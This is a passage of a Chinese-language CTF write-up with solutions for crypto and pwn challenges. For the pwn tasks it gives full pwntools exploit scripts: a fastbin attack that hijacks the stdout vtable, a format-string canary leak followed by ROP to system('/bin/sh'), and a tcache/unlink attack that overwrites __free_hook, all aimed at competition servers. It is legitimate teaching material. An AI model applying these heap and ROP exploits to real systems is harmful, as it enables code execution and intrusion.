    }
    fuzz();
拿到地址后将前面得到的`transfer`给该地址即可，然后使用这个地址调用`CaptureTheFlag`即可成功getflag
## Misc
### IRC checkin
进入IRC就可获得FLAG
## Crypto
### guess_polynomial
只要给的x够大，就能隔开一个个因子，冲就完事了
    from pwn import *
    #context.log_level = "debug"
    ip = "39.96.8.114"
    port = "9999"
    r = remote(ip,port)
    payload = "1"+"0"*130
    for xx in range(10):
        print r.recvuntil("coeff:")
        r.sendline(payload)
        str_tmp = r.recvline()
        str_tmp.rstrip()
        str_tmp = str_tmp[18:]
        r.recvuntil("coeff!")
        tmp_len = len(str_tmp)
        n = tmp_len/130
        i=tmp_len-1
        res = []
        for x in xrange(n):
            tmp = str_tmp[i-130:i]  
            res.append(tmp)
            #print tmp
            i -= 130
        res.append(str_tmp[:i])
        for i in xrange(len(res)-1):
            r.send( res[len(res)-i-1] + ' ')
        r.sendline(res[0])
    r.interactive()
## Pwn
### easiest
程序有system("/bin/sh")的后门
free后没有把指针置0
可以利用0x6020b5处的0x7f和0x602082处的0x40错位构造fastbin,来进行fastbin
attack，覆盖stdout指针指向0x602010，这个地址处的结构满足IO_FILE的检验机制，然后在0x6020b5处的指针可以改写结构体的mode为0xffffffff，vtable的值我们预留的system后门的值-0x38，这样printf调用_IO_xsputn，从vtable虚表中取函数时就会执行我们的system后门
exp:
    from pwn import *
    f=remote("39.96.9.148",9999)
    #f=gdb.debug("./aaa",'b* 0x400ac8')
    #f=process("./aaa")
    system_addr=0x400946
    def addnote(index,size,content="\x00"):
        f.sendlineafter("delete \n","1")
        f.sendlineafter(":",str(index))
        f.sendlineafter("Length:",str(size))
        f.sendlineafter("C:",content)
    def delete(num):
        f.sendlineafter("delete \n","2")
        f.sendlineafter(":",str(num))
    #0
    addnote(0,0x30)
    addnote(1,0x30)
    delete(0)
    delete(1)
    delete(0)
    addnote(2,0x30,p64(0x602082-8))
    addnote(3,0x30)
    addnote(4,0x38,"a")
    #1
    addnote(0,0x60)
    addnote(1,0x60)
    delete(0)
    delete(1)
    delete(0)
    addnote(2,0x60,p64(0x6020b5-8))
    addnote(3,0x60)
    addnote(4,0x60,"aaaaa")
    addnote(5,0x68,"a"*3+p64(0xffffffff)*3+p64(0x602090-0x38)*4)
    addnote(0,0x38,"a"*6+p64(system_addr)*2+p64(0x602010))
    print '1'
    f.sendline('1\n'*4)
    f.interactive()
### hardcore_fmt
刚开始的格式化字符串利用"%a%a%a%a%a"来leak
libc上的地址，gdb调试的时候发现libc中有canary的值，第二次任意地址写的机会就用来leak
canary的值，然后gets的时候ROP调用system，过程中发现%a泄露出的地址和libc基址的偏移会相差0x1000的整数倍，但相差不大，而且会变化，就写脚本直接爆破了libc基址，运行就能getshell了.
多跑几次就成功了。
    from pwn import *
    import time
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def getshell(f,x):
        #f=process("./hardcore_fmt","b* 0x555555554000+0x940")
        #f=remote("39.106.110.69",9999)
        f.sendlineafter("fmt\n","%a%a%a%a%a")
        f.recvuntil("0x0.0")
        f.recvuntil("0x0.0")
        f.recvuntil("0x0.0")
        fail_addr=int(f.recv(10)+'00',16)
        log.info("fail_addr : "+hex(fail_addr))
        f.sendline(str(fail_addr+0x29))
        try:
            f.recvuntil(": ")
        except:
             return
        canary_value=u64(f.recv(7).rjust(8,'\x00'))
        log.info("canary is : "+hex(canary_value))
        system_addr=fail_addr-0x60b500+libc.symbols['system']+i*0x1000
        pop_rdi_ret=fail_addr-0x60b500+0x5b4fd+i*0x1000
        print i
        log.info("libc base : "+hex(fail_addr-0x60b500))
        binsh_addr=fail_addr-0x60b500+0x1b3e9a+i*0x1000
        one_gadget=fail_addr-0x60b500+0x4f2c5+i*0x1000
        log.info(hex(one_gadget))
        #0x4f322
        #0x4f2c5
        retn_value=0xe4e3f+fail_addr-0x60b500
        f.recv()
        try:
            f.sendline("a"*0x108+p64(canary_value)+p64(0)*3+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr))
            f.sendline("ls")
        except:
            return;
        if f.recv():
            f.sendline("cat flag")
            f.interactive()
    i=1
    for i in range(-20,20):
        #f=process("./hardcore_fmt")
        f=remote("39.106.110.69",9999)
        f.settimeout(0.5)
        print "this is :"+hex(i)
        try:
            getshell(f,i)
        except:
            f.close()
            continue
        f.close()
    f.interactive()
# three
此题赛后解出
glibc版本2.27，有tcache机制
题目把条件限制的很死，最多只能分配3个堆块。刚开始先抬高堆，抬高的过程中留下地址最低三位为0x450的堆进行利用。连续free
0x450处的堆两次，然后通过edit
0x450的fd指针指向0x40a，在0x40a处分配堆块的大小恰好能覆盖0x450处的堆块大小的最低两字节，先free
0x450处的堆一次，再改写它为smallbin的大小(大小要能指向后面的堆块)，连续free
8次，使得其fd为main_arena+96的值，通过爆破三字节，使其fd指针指向IO_stdout-8,然后partial write
IO_write_base来leak libc基址
因为0x40a的堆块和指向IO_stdout的堆块都不能被释放，所以现在的问题就是如何能够在只能free和malloc一个堆块的条件下实现任意地址写。我的做法是先改写write缓冲区指针leak
heap地址。然后在0x40a的堆块中构造一个0x30大小的fake
chunk结构，并改写0x450处堆块的prev_size=0x30，prev_inuse标志位为0，大小为smallbin大小,free
0x450处的堆块7次填满tcache的时候edit其fd为_free_hook再delete并清除该堆块，由于会触发unlink和前面的fake
chunk合并不会改写它自身的fd指针，这样分配两次后就能得到一个指向free_hook的堆，改写它为system函数，delete操作执行system("$0")
getshell。
成功概率为1/4096，要碰运气。
本地测试时的exp:
    from pwn import *
    import time
    libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    context.log_level="debug"
    def addnote(content=""):
        f.sendlineafter("choice:","1")
        f.sendlineafter("content:",str(content))
    def delete(num,clear=0):
        f.sendlineafter("choice:","3")
        f.sendlineafter("idx:",str(num))
        if clear:
            f.sendlineafter("/n):","y")
        else:
            f.sendlineafter("/n):","n")
    def edit(num,content):
        f.sendlineafter("choice:","2")
        f.sendlineafter("idx:",str(num))
        f.sendlineafter("content:",str(content))
    def getshell(f):
        addnote()
        addnote()
        addnote()
        delete(1,1)
        delete(0,1)
        delete(2,0)
        edit(2,"\x00"*8)
        addnote()
        addnote()
        delete(0,1)
        delete(2,1)
        delete(1,0)
        edit(1,"\x00"*8)
        addnote()
        addnote()
        delete(2,1)
        delete(1,1)
        edit(0,"\x00"*8)
        addnote()
        addnote(p64(0)+p64(0x41)+p64(0)+p64(0x31))
        delete(2,1)
        delete(1,1)
        edit(0,"")
        addnote()
        addnote("")
        delete(0,0)
        edit(2,"a"*0x3e+"\xa1\x001\n")
        f.recvuntil("notes")
        print '1'
        delete(1,1)
        for i in range(7):
            delete(0,0)
        edit(2,"a"*0x3e+"\x61\x002\n")
        f.sendlineafter("idx:",str(0))
        f.sendlineafter("content:","\x58\x07")
        addnote()
        delete(0,1)
        addnote(p64(0)+p64(0xfbad1800)+p64(0)*3)
        libc_addr=u64(f.recv()[22:28].ljust(8,'\x00'))-0x3eb780
        log.info("libc_addr :"+hex(libc_addr))
        f.sendline("2")
        f.sendline(str(2))
        f.sendlineafter("content:","a"*0x3e+"\x51\x002")
        f.sendlineafter("idx:",str(0))
        content=p64(0)+p64(0xfbad1800)+p64(0)*3+p64(libc_addr+libc.symbols['__malloc_hook']+0x80)+p64(libc_addr+libc.symbols['__malloc_hook']+0x88)*2+"3"
        f.sendlineafter("content:",content)
        heap_addr=u64(f.recv(6).ljust(8,'\0'))-0x340
        log.info("heap_addr: "+hex(heap_addr))
        f.sendline(str(1))  
        f.sendlineafter("n):","n")
        edit(2,"$0\0\0\0\0"+p64(0)+p64(0x31)+p64(heap_addr+0x330-0x8*3)+p64(heap_addr+0x330-0x8*2)+p64(heap_addr+0x310)*2+p64(0x30)+"\xb0\x003")
        f.sendlineafter("idx:",str(1))  
        f.sendlineafter("/n):","n")
        for i in range(6):
            delete(1)
        edit(1,p64(libc_addr+libc.symbols['__free_hook'])+p64(libc_addr+libc.symbols['__malloc_hook']+0x70))
        delete(1,1)
        addnote()
        edit(2,"$0\0\0\0\0"+p64(0)+p64(0x31)+p64(heap_addr+0x330-0x8*3)+p64(heap_addr+0x330-0x8*2)+p64(heap_addr+0x310)*2+p64(0x30)+"\xf1\x003")
        f.sendlineafter("idx:",str(1))  
        f.sendlineafter("/n):","y")
        addnote(p64(libc_addr+libc.symbols['system']))
        f.sendline("3")
        f.sendline(str(2))
        f.interactive()
    f=gdb.debug("./three")
    getshell(f)